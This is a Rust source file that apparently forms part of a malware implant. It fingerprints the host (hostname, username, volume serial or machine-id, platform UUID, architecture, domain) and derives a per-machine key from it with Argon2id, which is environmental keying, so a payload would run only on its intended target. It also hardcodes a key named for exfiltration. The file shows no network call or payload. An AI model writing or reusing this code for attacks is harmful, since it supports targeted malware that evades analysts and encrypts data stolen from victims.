use argon2::{Algorithm, Argon2, Params, Version};
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Fingerprint {
    pub hostname: String,
    pub username: String,
    pub volume_serial: String,
    pub cpu_arch: String,
    pub domain: String,
}

impl Fingerprint {
    pub fn material(&self) -> Vec<u8> {
        format!("{}|{}|{}|{}|{}",
            self.hostname, self.username, self.volume_serial, self.cpu_arch, self.domain)
            .into_bytes()
    }
}

pub fn derive_env_key(fp: &Fingerprint, salt: &[u8]) -> [u8; 32] {
    let params = Params::new(64 * 1024, 3, 1, Some(32)).expect("argon2 params");
    let a2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut out = [0u8; 32];
    a2.hash_password_into(&fp.material(), salt, &mut out).expect("argon2");
    out
}

const EXFIL_KEY_HEX: &str = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
const ENVKEY_SALT: &[u8] = b"svc_salt_v2";

pub fn runtime_exfil_key() -> [u8; 32] {
    let mut k = [0u8; 32];
    hex_decode(EXFIL_KEY_HEX, &mut k);
    k
}

pub fn runtime_envkey(fp: &Fingerprint) -> [u8; 32] {
    derive_env_key(fp, ENVKEY_SALT)
}

fn hex_decode(s: &str, out: &mut [u8]) {
    let bytes = s.as_bytes();
    for i in 0..out.len() {
        let hi = nib(bytes[i * 2]);
        let lo = nib(bytes[i * 2 + 1]);
        out[i] = (hi << 4) | lo;
    }
}

fn nib(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        b'A'..=b'F' => b - b'A' + 10,
        _ => 0,
    }
}

pub fn fingerprint() -> Fingerprint {
    #[cfg(windows)]
    { windows_fp() }
    #[cfg(target_os = "linux")]
    { linux_fp() }
    #[cfg(target_os = "macos")]
    { macos_fp() }
}

#[cfg(windows)]
fn windows_fp() -> Fingerprint {
    let hostname = hostname::get().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default();
    let username = whoami::username();
    let volume_serial = read_volume_serial().unwrap_or_default();
    let cpu_arch = std::env::consts::ARCH.to_string();
    let domain = std::env::var("USERDOMAIN").unwrap_or_default();
    Fingerprint { hostname, username, volume_serial, cpu_arch, domain }
}

#[cfg(windows)]
fn read_volume_serial() -> Option<String> {
    use windows_sys::Win32::Storage::FileSystem::GetVolumeInformationW;
    let root: Vec<u16> = "C:\\\0".encode_utf16().collect();
    let mut serial: u32 = 0;
    unsafe {
        let _ = GetVolumeInformationW(
            root.as_ptr(),
            std::ptr::null_mut(),
            0,
            &mut serial,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
        );
    }
    Some(format!("{:08X}", serial))
}

#[cfg(target_os = "linux")]
fn linux_fp() -> Fingerprint {
    let hostname = hostname::get().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default();
    let username = whoami::username();
    let volume_serial = std::fs::read_to_string("/etc/machine-id")
        .map(|s| s.trim().to_string()).unwrap_or_default();
    let cpu_arch = std::env::consts::ARCH.to_string();
    let domain = std::fs::read_to_string("/etc/hostname")
        .map(|s| s.trim().to_string()).unwrap_or_default();
    Fingerprint { hostname, username, volume_serial, cpu_arch, domain }
}

#[cfg(target_os = "macos")]
fn macos_fp() -> Fingerprint {
    let hostname = hostname::get().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default();
    let username = whoami::username();
    let volume_serial = std::process::Command::new("ioreg")
        .args(["-rd1", "-c", "IOPlatformExpertDevice"])
        .output().ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .and_then(|s| s.lines().find(|l| l.contains("IOPlatformUUID"))
            .map(|l| l.split('"').nth(3).unwrap_or("").to_string()))
        .unwrap_or_default();
    let cpu_arch = std::env::consts::ARCH.to_string();
    Fingerprint { hostname, username, volume_serial, cpu_arch, domain: String::new() }
}
